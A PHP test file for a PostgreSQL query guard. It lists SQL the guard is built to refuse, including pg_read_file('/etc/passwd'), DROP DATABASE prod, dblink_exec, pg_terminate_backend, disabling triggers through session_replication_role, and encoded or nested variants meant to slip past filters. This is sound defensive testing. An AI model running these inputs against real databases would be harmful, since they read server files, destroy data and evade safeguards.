    'CREATE FUNCTION with a single-quoted body' => ["CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1' SET session_replication_role = replica"],
    'ALTER FUNCTION' => ['ALTER FUNCTION f() SET session_replication_role = replica'],
    'ALTER FUNCTION, second action' => ['ALTER FUNCTION f(int) SET search_path = public SET session_replication_role = replica'],
    'ALTER PROCEDURE with a quoted name' => ['ALTER PROCEDURE p() SET "session_replication_role" = replica'],
    'ALTER ROUTINE with a U& name' => ['ALTER ROUTINE r() SET U&"session\\005Freplication_role" = replica'],
    'ALTER FUNCTION, lower case, comment' => ['alter function f() set /* x */ session_replication_role to replica'],
    'ALTER DATABASE' => ['ALTER DATABASE app SET session_replication_role = replica'],
    'ALTER ROLE' => ['ALTER ROLE bob SET session_replication_role = replica'],
    'ALTER ROLE IN DATABASE' => ['ALTER ROLE bob IN DATABASE app SET session_replication_role = replica'],
    'ALTER USER IN DATABASE' => ['ALTER USER bob IN DATABASE app SET session_replication_role TO replica'],
    'ALTER DATABASE in a DO body' => ['DO $$ BEGIN ALTER DATABASE app SET session_replication_role = replica; END $$'],
    'ALTER FUNCTION after THEN in a DO body' => ['DO $$ BEGIN IF true THEN ALTER FUNCTION f() SET session_replication_role = replica; END IF; END $$'],
    'ALTER FUNCTION in a quoted DO body' => ["DO 'BEGIN ALTER FUNCTION f() SET session_replication_role = replica; END'"],
    'CREATE FUNCTION ... SET in a DO body' => ['DO $$ BEGIN CREATE FUNCTION g() RETURNS int LANGUAGE sql SET session_replication_role = replica AS $g$ SELECT 1 $g$; END $$'],
    'ALTER FUNCTION in a function body' => ['CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN ALTER FUNCTION g() SET session_replication_role = replica; END $$'],
    'ALTER FUNCTION in a single-quoted function body' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN ALTER DATABASE app SET session_replication_role = replica; END'"],
    'nested DO body in a DO body' => ['DO $$ BEGIN DO $x$ BEGIN ALTER DATABASE app SET session_replication_role = replica; END $x$; END $$'],
]);

test('a SET clause on a function, procedure, database or role whose setting cannot be read is refused', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('the guard cannot tell which setting');
})->with([
    'quoted name that is no plain name' => ['ALTER FUNCTION f() SET "session_replication_role " = replica'],
    'quoted name in a DO body' => ['DO $$ BEGIN ALTER DATABASE app SET "a-b" = 1; END $$'],
    'name missing' => ['ALTER DATABASE app SET = replica'],
]);

test('a top-level SET with a U& setting name is judged by the decoded name', function () {
    $refused = inspect('SET U&"session\\005Freplication_role" = replica', DbDriver::Pgsql);

    expect($refused->passes())->toBeFalse()
        ->and(implode("\n", $refused->violations))->toContain('SET session_replication_role is not allowed')
        ->and(inspect('SET U&"search\\005Fpath" = public', DbDriver::Pgsql)->passes())->toBeTrue();
});

test('ordinary SET clauses on functions, procedures and databases pass', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->violations)->toBe([]);
})->with([
    'CREATE FUNCTION ... SET search_path FROM CURRENT' => ['CREATE FUNCTION f() RETURNS int LANGUAGE sql SET search_path FROM CURRENT AS $$ SELECT 1 $$'],
    'ALTER FUNCTION ... SET search_path' => ['ALTER FUNCTION f() SET search_path = public, pg_temp'],
    'ALTER FUNCTION ... SET SCHEMA' => ['ALTER FUNCTION f() SET SCHEMA archive'],
    'ALTER DATABASE ... SET TABLESPACE' => ['ALTER DATABASE app SET TABLESPACE fast'],
    'ALTER DATABASE ... SET statement_timeout' => ["ALTER DATABASE app SET statement_timeout TO '5s'"],
    'ALTER FUNCTION ... RESET ALL' => ['ALTER FUNCTION f() RESET ALL'],
    'a body that sets a row value' => ['CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN UPDATE t SET (a, b) = (1, 2) WHERE id = 1; END $$'],
    'a single-quoted body that sets a row value' => ["CREATE FUNCTION f() RETURNS void LANGUAGE sql AS 'UPDATE t SET (a, b) = (1, 2) WHERE id = 1'"],
]);

test('a DO block or a function in a language other than plpgsql and sql is refused', function (string $sql, string $needle) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($needle);
})->with([
    'DO plperl, leading' => ['DO LANGUAGE plperl $$ return 1; $$', 'LANGUAGE plperl is not allowed'],
    'DO pltcl, trailing' => ['DO $$ return 1 $$ LANGUAGE pltcl', 'LANGUAGE pltcl is not allowed'],
    'DO, double-quoted language' => ['DO LANGUAGE "plperl" $$ return 1; $$', 'LANGUAGE plperl is not allowed'],
    'DO, U& language' => ['DO LANGUAGE U&"pl\\0070erl" $$ return 1; $$', 'LANGUAGE plperl is not allowed'],
    'DO, U& untrusted language' => ['DO $$ x $$ LANGUAGE U&"pl\\0070erlu"', 'plperlu is an untrusted procedural language'],
    'DO, upper case' => ['DO $$ x $$ LANGUAGE PLV8', 'LANGUAGE plv8 is not allowed'],
    'CREATE FUNCTION plperl' => ['CREATE FUNCTION f() RETURNS int LANGUAGE plperl AS $$ return 1; $$', 'LANGUAGE plperl is not allowed'],
    'CREATE FUNCTION plpython3u' => ['CREATE FUNCTION f() RETURNS text LANGUAGE plpython3u AS $$ import os $$', 'plpython3u is an untrusted procedural language'],
    'CREATE FUNCTION c' => ["CREATE FUNCTION f(int) RETURNS int AS 'my_module', 'my_function' LANGUAGE c", 'LANGUAGE c is not allowed'],
    'CREATE FUNCTION internal' => ["CREATE FUNCTION f(int) RETURNS int LANGUAGE internal AS 'int4abs'", 'LANGUAGE internal is not allowed'],
    'CREATE FUNCTION, single-quoted language' => ["CREATE FUNCTION f() RETURNS int LANGUAGE 'plperl' AS \$\$ return 1; \$\$", 'LANGUAGE plperl is not allowed'],
    'CREATE FUNCTION, double-quoted language' => ['CREATE OR REPLACE FUNCTION f() RETURNS int AS $$ return 1; $$ LANGUAGE "plv8"', 'LANGUAGE plv8 is not allowed'],
    'CREATE PROCEDURE, U& language' => ['CREATE PROCEDURE p() LANGUAGE U&"pl\\0070erl" AS $$ 1; $$', 'LANGUAGE plperl is not allowed'],
    'CREATE FUNCTION, dollar-quoted language' => ['CREATE FUNCTION f() RETURNS int LANGUAGE $l$plperl$l$ AS $$ return 1; $$', 'language the guard cannot read'],
    'DO, unresolvable U& language' => ['DO LANGUAGE U&"sql\\0020" $$ SELECT 1 $$', 'language the guard cannot read'],
    "DO, E'' language" => ["DO LANGUAGE E'SQL' \$\$ SELECT 1 \$\$", 'names its language with a string literal'],
    'CREATE FUNCTION without LANGUAGE' => ['CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$', 'without a LANGUAGE clause'],
    'CREATE FUNCTION plperl in a DO body' => ['DO $$ BEGIN CREATE FUNCTION g() RETURNS int LANGUAGE plperl AS $g$ return 1; $g$; END $$', 'LANGUAGE plperl is not allowed'],
    'CREATE FUNCTION c in a function body' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS \$\$ BEGIN CREATE FUNCTION g(int) RETURNS int AS 'm', 's' LANGUAGE c; END \$\$", 'LANGUAGE c is not allowed'],
    'nested DO plperl in a DO body' => ['DO $$ BEGIN DO LANGUAGE plperl $x$ return 1; $x$; END $$', 'LANGUAGE plperl is not allowed'],
    'nested DO, quoted language, in a quoted DO body' => ["DO 'BEGIN DO LANGUAGE \"plperl\" ''return 1;''; END'", 'LANGUAGE plperl is not allowed'],
]);

test('DO blocks and functions in plpgsql or sql pass the language rule', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->violations)->toBe([]);
})->with([
    'DO without LANGUAGE' => ['DO $$ BEGIN PERFORM 1; END $$'],
    'DO plpgsql, quoted' => ['DO LANGUAGE "plpgsql" $$ BEGIN PERFORM 1; END $$'],
    'DO plpgsql, U&' => ['DO $$ BEGIN PERFORM 1; END $$ LANGUAGE U&"plpgsq\\006C"'],
    'CREATE FUNCTION sql' => ['CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$'],
    'CREATE FUNCTION SQL, upper case, trailing' => ['CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE SQL'],
    "CREATE FUNCTION 'sql'" => ["CREATE FUNCTION f() RETURNS int LANGUAGE 'sql' AS \$\$ SELECT 1 \$\$"],
    'CREATE FUNCTION with a RETURN body and no LANGUAGE' => ['CREATE FUNCTION f(a int) RETURNS int RETURN a + 1'],
    'INSERT ... ON CONFLICT DO NOTHING' => ['INSERT INTO t (id) VALUES (1) ON CONFLICT DO NOTHING'],
    'ON CONFLICT DO UPDATE in a DO body' => ['DO $$ BEGIN INSERT INTO t (id) VALUES (1) ON CONFLICT (id) DO UPDATE SET n = 2; END $$'],
    'a function body naming a language in data' => ["CREATE FUNCTION f() RETURNS text LANGUAGE sql AS \$\$ SELECT 'LANGUAGE plperl' \$\$"],
]);

test('a quoted language name is matched as written, the way PostgreSQL resolves it', function (string $sql, string $needle) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($needle);
})->with([
    'DO, "Sql"' => ['DO LANGUAGE "Sql" $$ SELECT 1 $$', 'LANGUAGE "Sql" is not allowed'],
    'DO, "PLPGSQL", trailing' => ['DO $$ BEGIN END $$ LANGUAGE "PLPGSQL"', 'LANGUAGE "PLPGSQL" is not allowed'],
    'DO, U& "Sql"' => ['DO LANGUAGE U&"S\\0071l" $$ SELECT 1 $$', 'LANGUAGE "Sql" is not allowed'],
    'CREATE FUNCTION, "Sql"' => ['CREATE FUNCTION f() RETURNS int LANGUAGE "Sql" AS $$ SELECT 1 $$', 'LANGUAGE "Sql" is not allowed'],
    "CREATE FUNCTION, 'Sql'" => ["CREATE FUNCTION f() RETURNS int LANGUAGE 'Sql' AS \$\$ SELECT 1 \$\$", 'LANGUAGE "Sql" is not allowed'],
    "CREATE FUNCTION, E'SQL'" => ["CREATE FUNCTION f() RETURNS int LANGUAGE E'SQL' AS \$\$ SELECT 1 \$\$", 'LANGUAGE "SQL" is not allowed'],
    'CREATE PROCEDURE, U& "PlPgSql"' => ['CREATE PROCEDURE p() LANGUAGE U&"PlPg\\0053ql" AS $$ BEGIN END $$', 'LANGUAGE "PlPgSql" is not allowed'],
    'nested DO "Sql" in a DO body' => ['DO $$ BEGIN DO LANGUAGE "Sql" $x$ SELECT 1 $x$; END $$', 'LANGUAGE "Sql" is not allowed'],
]);

test('bare language names fold to lower case and quoted ones written in lower case pass', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->violations)->toBe([]);
})->with([
    'DO, bare PLPGSQL' => ['DO LANGUAGE PLPGSQL $$ BEGIN PERFORM 1; END $$'],
    'DO, "plpgsql"' => ['DO $$ BEGIN PERFORM 1; END $$ LANGUAGE "plpgsql"'],
    'CREATE FUNCTION, bare Sql' => ['CREATE FUNCTION f() RETURNS int LANGUAGE Sql AS $$ SELECT 1 $$'],
    'CREATE FUNCTION, "sql"' => ['CREATE FUNCTION f() RETURNS int LANGUAGE "sql" AS $$ SELECT 1 $$'],
    'CREATE FUNCTION, U& "sql"' => ['CREATE FUNCTION f() RETURNS int LANGUAGE U&"\\0073ql" AS $$ SELECT 1 $$'],
]);

test('statements that create a language or rename one are refused', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('CREATE LANGUAGE and ALTER LANGUAGE ... RENAME are not allowed through QueryProxy');
})->with([
    'CREATE LANGUAGE' => ['CREATE LANGUAGE "Sql" HANDLER plperl_call_handler'],
    'CREATE TRUSTED PROCEDURAL LANGUAGE' => ['CREATE TRUSTED PROCEDURAL LANGUAGE foo HANDLER plperl_call_handler'],
    'CREATE OR REPLACE LANGUAGE' => ['CREATE OR REPLACE LANGUAGE plpgsql HANDLER plperl_call_handler'],
    'ALTER LANGUAGE ... RENAME' => ['ALTER LANGUAGE plperl RENAME TO "Sql"'],
    'ALTER PROCEDURAL LANGUAGE ... RENAME' => ['ALTER PROCEDURAL LANGUAGE plperl RENAME TO plpgsql'],
    'CREATE LANGUAGE in a DO body' => ['DO $$ BEGIN CREATE LANGUAGE "Sql" HANDLER plperl_call_handler; END $$'],
    'ALTER LANGUAGE ... RENAME in a function body' => ['CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN ALTER LANGUAGE plperl RENAME TO plpgsql; END $$'],
]);

test('changing the owner of a language or dropping one passes the language rule', function (string $sql) {
    expect(implode("\n", inspect($sql, DbDriver::Pgsql)->violations))->not->toContain('LANGUAGE');
})->with([
    'ALTER LANGUAGE ... OWNER TO' => ['ALTER LANGUAGE plperl OWNER TO admin'],
    'DROP LANGUAGE' => ['DROP LANGUAGE plperl'],
]);

test('a quoted setting name on a database, function or procedure is judged by its value', function (string $sql, bool $passes) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBe($passes);

    if (! $passes) {
        expect(implode("\n", $result->violations))->toContain('SET session_replication_role is not allowed');
    }
})->with([
    'ALTER DATABASE, dotted quoted name' => ["ALTER DATABASE app SET \"app.jwt_secret\" TO 'x'", true],
    'ALTER DATABASE, U& dotted name' => ["ALTER DATABASE app SET U&\"app.jwt\\005Fsecret\" TO 'x'", true],
    'ALTER DATABASE, quoted parts' => ["ALTER DATABASE app SET \"app\".\"jwt_secret\" = 'x'", true],
    'CREATE FUNCTION, dotted quoted name' => ["CREATE FUNCTION f() RETURNS int LANGUAGE sql SET \"app.tenant\" = 'a' AS \$\$ SELECT 1 \$\$", true],
    'ALTER DATABASE, quoted guarded name' => ['ALTER DATABASE app SET "session_replication_role" TO replica', false],
    'ALTER DATABASE, quoted guarded name in mixed case' => ['ALTER DATABASE app SET "Session_Replication_Role" TO replica', false],
]);

test('a DO body is held to the blocked-function and guarded-setting rules of the top level', function (string $sql, string $message) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($message);
})->with([
    'PERFORM dblink_exec' => ["DO \$\$ BEGIN PERFORM dblink_exec('dbname=x', 'DROP DATABASE prod'); END \$\$", 'Inside the DO block body: dblink_exec() is not allowed'],
    'PERFORM pg_terminate_backend' => ['DO $$ BEGIN PERFORM pg_terminate_backend(1); END $$', 'Inside the DO block body: pg_terminate_backend() is not allowed'],
    'nested quoted DO body' => ["DO \$\$ BEGIN DO 'BEGIN PERFORM pg_terminate_backend(1); END'; END \$\$", 'Inside the DO block body: pg_terminate_backend() is not allowed'],
    'nested quoted DO body with LANGUAGE' => ["DO \$\$ BEGIN DO LANGUAGE plpgsql 'BEGIN SET session_replication_role = replica; END'; END \$\$", 'Inside the DO block body: SET session_replication_role is not allowed'],
    'schema-qualified, quoted name' => ['DO $$ BEGIN PERFORM pg_catalog."pg_terminate_backend"(1); END $$', 'Inside the DO block body: pg_terminate_backend() is not allowed'],
    'U& name' => ['DO $$ BEGIN PERFORM U&"\\0070g_terminate_backend"(1); END $$', 'Inside the DO block body: pg_terminate_backend() is not allowed'],
    'assignment from query_to_xml' => ["DO \$\$ DECLARE x xml; BEGIN x := query_to_xml('SELECT 1', true, false, ''); END \$\$", 'Inside the DO block body: query_to_xml() is not allowed'],
    'ts_stat in a loop' => ["DO \$\$ DECLARE r record; BEGIN FOR r IN SELECT * FROM ts_stat('SELECT 1') LOOP NULL; END LOOP; END \$\$", 'Inside the DO block body: ts_stat() is not allowed'],
    'call in nested dollar-quoted text' => ['DO $$ BEGIN CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS $f$ BEGIN PERFORM pg_terminate_backend(1); END $f$; END $$', 'Inside the DO block body: pg_terminate_backend() is not allowed'],
    'quoted DO body' => ["DO 'BEGIN PERFORM pg_terminate_backend(1); END'", 'Inside the DO block body: pg_terminate_backend() is not allowed'],
    'set_config' => ["DO \$\$ BEGIN PERFORM set_config('session_replication_role', 'replica', false); END \$\$", "Inside the DO block body: set_config('session_replication_role') is not allowed"],
    'set_config with an E string' => ["DO \$\$ BEGIN PERFORM set_config(E'session\\_replication_role', 'replica', false); END \$\$", "Inside the DO block body: set_config('session_replication_role') is not allowed"],
    'set_config with a U& string' => ["DO \$\$ BEGIN PERFORM set_config(U&'session\\005freplication_role', 'replica', false); END \$\$", "Inside the DO block body: set_config('session_replication_role') is not allowed"],
    'set_config with a computed name' => ["DO \$\$ BEGIN PERFORM set_config('session_' || 'replication_role', 'replica', false); END \$\$", 'Inside the DO block body: set_config() with a setting name that is not a plain string literal'],
    'set_config with a dollar-quoted name' => ["DO \$\$ BEGIN PERFORM set_config(\$n\$session_replication_role\$n\$, 'replica', false); END \$\$", 'Inside the DO block body: set_config()'],
    'SET' => ['DO $$ BEGIN SET session_replication_role = replica; END $$', 'Inside the DO block body: SET session_replication_role is not allowed'],
    'SET LOCAL after THEN' => ['DO $$ BEGIN IF true THEN SET LOCAL session_replication_role TO replica; END IF; END $$', 'session_replication_role is not allowed'],
    'lower-case set with a quoted name' => ['DO $$ BEGIN set "session_replication_role" = replica; END $$', 'Inside the DO block body: SET session_replication_role is not allowed'],
    'SET after a comment' => ['DO $$ BEGIN /* x */ SET session_replication_role = replica; END $$', 'Inside the DO block body: SET session_replication_role is not allowed'],
]);

test('a DO body may call ordinary functions and set ordinary settings', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeTrue();
})->with([
    'set_config of an application setting' => ["DO \$\$ BEGIN PERFORM set_config('app.user_id', '42', true); END \$\$"],
    'SET of an ordinary setting' => ["DO \$\$ BEGIN SET LOCAL statement_timeout = '5s'; END \$\$"],
    'UPDATE ... SET' => ['DO $$ BEGIN UPDATE t SET session_replication_role = 1 WHERE id = 1; END $$'],
    'ordinary calls' => ["DO \$\$ BEGIN PERFORM pg_sleep(0); RAISE NOTICE '%', now(); END \$\$"],
    'blocked name in quoted data' => ["DO \$\$ BEGIN RAISE NOTICE 'pg_terminate_backend(1)'; END \$\$"],
]);

test('a single-quoted function body is scanned like a DO body', function (string $sql, string $message) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($message);
})->with([
    'EXECUTE' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN EXECUTE ''DROP DATABASE prod''; END'", 'Inside the function body: dynamic SQL (EXECUTE) is not allowed'],
    'forbidden statement' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN DROP DATABASE prod; END'", 'Inside the function body: DROP DATABASE'],
    'blocked function' => ["CREATE OR REPLACE FUNCTION f() RETURNS void AS 'BEGIN PERFORM pg_terminate_backend(1); END' LANGUAGE plpgsql", 'Inside the function body: pg_terminate_backend() is not allowed'],
    'guarded SET' => ["CREATE PROCEDURE p() LANGUAGE plpgsql AS 'BEGIN SET session_replication_role = replica; END'", 'Inside the function body: SET session_replication_role is not allowed'],
    'SQL body with a file read' => ["CREATE FUNCTION f() RETURNS text LANGUAGE sql AS 'SELECT pg_read_file(''/etc/passwd'')'", 'Inside the function body'],
    'E string body' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS E'BEGIN PERFORM pg_terminate_backend(1); END'", 'Inside the function body: pg_terminate_backend() is not allowed'],
    'E string hiding a call behind \\\\\'' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS E'BEGIN PERFORM \\'a\\', pg_terminate_backend(1); END'", 'Inside the function body: pg_terminate_backend() is not allowed'],
    'inside a DO body' => ["DO \$\$ BEGIN CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN EXECUTE ''DROP DATABASE prod''; END'; END \$\$", 'Inside the function body: dynamic SQL (EXECUTE) is not allowed'],
    'inside a DO body, blocked function' => ["DO \$\$ BEGIN CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN PERFORM dblink_exec(''x'', ''y''); END'; END \$\$", 'Inside the function body: dblink_exec() is not allowed'],
    'inside a quoted DO body' => ["DO 'BEGIN CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS ''BEGIN EXECUTE ''''SELECT 1''''; END''; END'", 'Inside the function body: dynamic SQL (EXECUTE) is not allowed'],
    'inside a function body in a DO body' => ["DO \$\$ BEGIN CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS \$f\$ BEGIN CREATE FUNCTION g() RETURNS void LANGUAGE plpgsql AS 'BEGIN EXECUTE ''SELECT 1''; END'; END \$f\$; END \$\$", 'Inside the function body: dynamic SQL (EXECUTE) is not allowed'],
    'comment between AS and the body' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS /* x */ 'BEGIN EXECUTE ''SELECT 1''; END'", 'Inside the function body: dynamic SQL (EXECUTE) is not allowed'],
]);

test('a single-quoted function body the guard cannot read is refused', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('function body');
})->with([
    // PostgreSQL joins string literals split across lines into one body.
    'continued literal' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN EXEC'\n'UTE ''SELECT 1''; END'"],
    'continued literal after a comment' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN EXEC' -- x\n'UTE ''SELECT 1''; END'"],
    'unterminated literal' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN PERFORM 1; END"],
    'open block comment' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN /* PERFORM 1; END'"],
    'UESCAPE' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN PERFORM U&\"!0070g_terminate_backend\" UESCAPE ''!''(1); END'"],
]);

test('an ordinary single-quoted function body passes', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeTrue();
})->with([
    'SQL body' => ["CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'"],
    'plpgsql body with quoted data' => ["CREATE OR REPLACE FUNCTION f() RETURNS void LANGUAGE plpgsql AS 'BEGIN RAISE NOTICE ''pg_terminate_backend(1)''; UPDATE t SET x = 1 WHERE id = 2; END'"],
    'inside a DO body' => ["DO \$\$ BEGIN CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'; END \$\$"],
    'a string after AS outside a routine' => ["SELECT 'a' AS x"],
    'a default argument' => ["CREATE FUNCTION f(a text DEFAULT 'x') RETURNS text LANGUAGE sql AS 'SELECT a'"],
]);

test('a dollar-quoted function body is scanned like a DO body', function (string $sql, string $message) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($message);
})->with([
    'EXECUTE' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS \$\$ BEGIN EXECUTE 'SELECT 1'; END \$\$", 'Inside the function body: dynamic SQL (EXECUTE) is not allowed'],
    'forbidden statement' => ['CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN DROP DATABASE prod; END $$', 'Inside the function body: DROP DATABASE'],
    'blocked function, tagged, OR REPLACE' => ['CREATE OR REPLACE FUNCTION f() RETURNS void AS $f$ BEGIN PERFORM pg_terminate_backend(1); END $f$ LANGUAGE plpgsql', 'Inside the function body: pg_terminate_backend() is not allowed'],
    'LANGUAGE sql calling query_to_xml' => ["CREATE FUNCTION f() RETURNS xml LANGUAGE sql AS \$\$ SELECT query_to_xml('SELECT 1', true, false, '') \$\$", 'Inside the function body: query_to_xml() is not allowed'],
    'LANGUAGE sql calling set_config' => ["CREATE FUNCTION f() RETURNS text LANGUAGE sql AS \$\$ SELECT set_config('session_replication_role', 'replica', false) \$\$", "Inside the function body: set_config('session_replication_role') is not allowed"],
    'procedure with SET' => ['CREATE PROCEDURE p() LANGUAGE plpgsql AS $$ BEGIN SET session_replication_role = replica; END $$', 'Inside the function body: SET session_replication_role is not allowed'],
    'comment between AS and the body' => ["CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS /* x */ \$\$ BEGIN PERFORM dblink_exec('a', 'b'); END \$\$", 'Inside the function body: dblink_exec() is not allowed'],
    'lower case' => ['create or replace procedure p() language plpgsql as $$ begin perform pg_cancel_backend(1); end $$', 'Inside the function body: pg_cancel_backend() is not allowed'],
]);

test('a function body the guard cannot extract is refused', function (string $sql, string $needle) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($needle);
})->with([
    'BEGIN ATOMIC' => ['CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN ATOMIC SELECT 1; END', 'BEGIN ATOMIC'],
    'BEGIN ATOMIC in one statement' => ['CREATE PROCEDURE p() LANGUAGE sql BEGIN ATOMIC END', 'BEGIN ATOMIC'],
    'no body' => ['CREATE FUNCTION f() RETURNS int LANGUAGE sql', 'function body'],
]);

test('ordinary dollar-quoted function bodies and triggers pass', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->violations)->toBe([]);
})->with([
    'SQL body' => ['CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$'],
    'trigger function' => ['CREATE OR REPLACE FUNCTION touch() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN NEW.updated_at := now(); RETURN NEW; END $$'],
    'dollar-quoted default argument' => ['CREATE FUNCTION f(a text DEFAULT $d$x$d$) RETURNS text LANGUAGE sql AS $$ SELECT a $$'],
    'SQL-standard RETURN body' => ['CREATE FUNCTION f(a int) RETURNS int LANGUAGE sql RETURN a + 1'],
    'EXECUTE FUNCTION trigger' => ['CREATE TRIGGER t BEFORE UPDATE ON items FOR EACH ROW EXECUTE FUNCTION touch()'],
    'EXECUTE PROCEDURE trigger with an argument' => ["CREATE TRIGGER t BEFORE UPDATE ON items FOR EACH ROW EXECUTE PROCEDURE touch('a')"],
]);

test('an apostrophe in nested dollar-quoted data does not reject the DO block', function () {
    expect(inspect("DO \$\$ BEGIN RAISE NOTICE \$m\$ it's done \$m\$; UPDATE t SET x = 1 WHERE id = 2; END \$\$", DbDriver::Pgsql)->passes())->toBeTrue();
});

test('an open block comment inside a nested dollar-quoted string does not reject the DO block', function () {
    expect(inspect('DO $$ BEGIN RAISE NOTICE $m$ /* $m$; END $$', DbDriver::Pgsql)->passes())->toBeTrue();
});

test('code before an open block comment in a nested dollar-quoted string is still scanned', function () {
    $result = inspect("DO \$\$ BEGIN EXECUTE \$a\$SELECT pg_read_file('/etc/passwd') /*\$a\$ || '*/'; END \$\$", DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('Inside the DO block body: Server-side file IO functions');
});

test('a DO block with one body and a plain language name still passes', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeTrue();
})->with([
    'single-quoted body, trailing language' => "DO 'BEGIN PERFORM 1; END' LANGUAGE plpgsql",
    'single-quoted body with a doubled quote' => "DO 'BEGIN RAISE NOTICE ''x''; END'",
    'string in a comment before the body' => "DO /* 'x' */ \$\$ BEGIN PERFORM 1; END \$\$",
    'U& identifier that is no function' => 'DO $$ BEGIN UPDATE t SET U&"\\0061" = 1 WHERE id = 1; END $$',
]);

test('text PostgreSQL reads as string data in a DO body is not scanned as code', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeTrue();
})->with([
    // In an E string \' escapes the quote, so the call stays inside it.
    'call inside an E string' => "DO \$\$ BEGIN PERFORM E'a\\', pg_read_file(/etc/passwd) --'; END \$\$",
    '"#" inside a string' => "DO \$\$ BEGIN UPDATE t SET note = 'x # pg_read_file(1)' WHERE id = 1; END \$\$",
    'quoted column name' => "DO \$\$ BEGIN UPDATE t SET \"Note\" = 'x' WHERE id = 1; END \$\$",
]);

test('an untrusted language is caught by the pl...u convention, not only by name', function () {
    // plpython4u is in no list; the naming convention is what refuses it.
    expect(inspect('CREATE EXTENSION plpython4u')->passes())->toBeFalse()
        ->and(inspect('DO $$ x $$ LANGUAGE plpython4u')->passes())->toBeFalse();
});

test('trusted procedural languages are not caught by the convention', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'CREATE EXTENSION plpgsql',
    'CREATE EXTENSION pltcl',
    'CREATE EXTENSION plperl',
    'CREATE EXTENSION plv8',
    'CREATE EXTENSION pllua',
]);

test('EXPLAIN ANALYZE is judged by the statement it executes', function () {
    $delete = inspect('EXPLAIN ANALYZE DELETE FROM t', DbDriver::Pgsql);
    $update = inspect('EXPLAIN (ANALYZE, BUFFERS) UPDATE t SET a=1 WHERE id=1', DbDriver::Pgsql);
    $select = inspect('EXPLAIN ANALYZE SELECT 1', DbDriver::Pgsql);

    expect($delete->passes())->toBeFalse()
        ->and($delete->type())->toBe(StatementType::Write)
        ->and($update->passes())->toBeTrue()
        ->and($update->type())->toBe(StatementType::Write)
        ->and($select->passes())->toBeTrue()
        ->and($select->type())->toBe(StatementType::Read);
});

test('EXPLAIN without ANALYZE stays a read', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read)
        ->and($result->preparedSql())->toBe($sql);
})->with([
    'plain' => 'EXPLAIN DELETE FROM t WHERE id=1',
    'ANALYZE switched off' => 'EXPLAIN (ANALYZE false) DELETE FROM t',
    'ANALYZE off among other options' => 'EXPLAIN (ANALYZE off, COSTS) UPDATE t SET a = 1',
    'VERBOSE only' => 'EXPLAIN VERBOSE DELETE FROM t',
]);
